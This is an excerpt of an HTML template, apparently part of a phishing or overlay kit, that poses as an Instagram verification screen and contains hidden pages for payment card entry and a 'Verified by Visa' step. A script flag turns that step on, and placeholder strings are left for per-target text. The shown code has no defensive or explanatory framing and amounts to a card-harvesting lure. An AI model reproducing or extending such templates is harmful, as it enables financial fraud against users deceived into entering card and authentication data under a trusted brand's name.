...
background:url('http://i.imgur.com/2VkqDdQ.jpg');
...
<script type="text/javascript">
  var askVbv=true;
  var personal_page__bottom_text="Some rundom text to insert to containr just to chek how it loks.Some rundom text to insert to containr just to chek how ow it loks.Some rundom text to insert to containr just to chek how it loks.Some rundom text to insert to containr just to chek how it loks.";
</script>
				...
				<div  class="control "  style="">
						     <div  class="stol w100 "  style="table-layout:fixed">
										...
										<div  class="td  left_ middle"  style="">
												<span  class="wu_logo "><img src="http://i.imgur.com/No70SJr.png" style="width:150px" class=""/></span>
										</div>
		...
		<div  class="stol h100  "  style="">
						<div  class="tr h100"  style="">
								<div  class="td  center middle "  style="">
								      <div  class="container"  style="">
										<img src="http://i.imgur.com/CUNJWrZ.png" style="width:56px" class=""/>
									  <h5>{{verification}}</h5>
									  <p class="p787" style="line-height:1.2em">{{welkome_text}}</p>	  
									  </div>
						...
						<div  class="tr "  style="">
								<div  class="td center"  style="display: none">
										<div  class="container c7878"  style="padding-bottom:20px">
												Tap "Agree and continue" to accept the <a class="terms" >Instagram Terms of Service and Privacy policy</a>
										</div>
								</div>
						</div>
		</div>
...
<div  class="cc_page  hidden__"  style="padding-top:15px;padding-bottom:50px">
		<div  class="container "  style="">
				...
				<h4 class=""  style="font-weight:300">{{card_step_title}}</h4>
				<div  class="row "  style="">
				...
				<div  class="row "  style="">
						<div  class="col-sm-12"  style="padding-top:0px">
									<div  class="form-group has-feedback"  style="">
											...
											<small class="text-primary"><span  class="fa fa-exclamation-triangle"></span>&nbsp;{{hint_card_name}}</small>
											<span class="glyphicon glyphicon-exclamation-sign form-control-feedback hidden__" ></span>
									</div>
						</div>
				</div>
...
<div  class="vbv_page hidden__"  style="padding-top:15px;padding-bottom:50px;background:white">
		<div  class="container "  style="">
